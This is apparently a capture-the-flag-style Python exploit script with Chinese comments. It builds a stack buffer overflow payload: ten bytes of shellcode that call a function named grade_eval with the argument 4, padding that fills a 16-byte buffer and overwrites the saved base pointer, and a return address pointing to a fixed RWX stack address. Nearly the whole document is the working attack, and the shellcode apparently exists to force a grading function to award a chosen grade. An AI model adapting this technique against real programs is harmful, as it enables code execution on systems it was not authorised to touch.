import sys

# ---- 栈上 shellcode：把参数放进 rdi，然后调用 grade_eval ----
#   push 4                    ; 6a 04
#   pop  rdi                  ; 5f          -> 第一个参数 grade = 4
#   mov  eax, 0x401a87        ; b8 87 1a 40 00  -> grade_eval 地址（32 位写法，自动零扩展）
#   call rax                  ; ff d0
SHELLCODE = bytes([
    0x6a, 0x04,
    0x5f,
    0xb8, 0x87, 0x1A, 0x40, 0x00,
    0xFF, 0xD0,
])

# input() 里 expression 位于 rbp-0x10；由于 __wrap_main 用
#   mov rsp, [fixed_stack_top]
# 把栈切到 mmap 固定区（0x721000000000，RWX），这个地址每次运行都一样。
BUF = 0x721000800FD0

payload  = SHELLCODE
payload += b"A" * (16 - len(SHELLCODE))   # 填满 16 字节缓冲区
payload += b"B" * 8                       # 覆盖 saved rbp
payload += BUF.to_bytes(8, "little")      # 返回地址 -> 指向栈上的 shellcode
payload += b"\n"

sys.stdout.buffer.write(payload)
